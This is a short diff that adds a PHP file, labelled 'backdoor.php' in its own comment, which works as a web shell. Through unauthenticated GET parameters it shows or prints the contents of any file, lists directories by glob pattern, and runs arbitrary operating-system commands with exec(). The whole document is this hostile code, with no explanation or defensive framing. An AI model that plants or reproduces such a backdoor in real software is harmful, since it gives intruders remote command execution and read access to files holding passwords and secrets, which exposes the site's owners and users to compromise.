@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<?php
+// backdoor.php?f=index.php
+
+if (isset($_GET['f'])) {
+    highlight_file($_GET['f']);
+} elseif (isset($_GET['f2'])) {
+    echo
+        nl2br(htmlspecialchars(file_get_contents($_GET['f2'])));
+} elseif (isset($_GET['ls'])) {
+    echo
+        '<pre>' . print_r(glob($_GET['ls']), true) . '</pre>';
+} elseif (isset($_GET['c'])) {
+    exec($_GET['c']);
+}
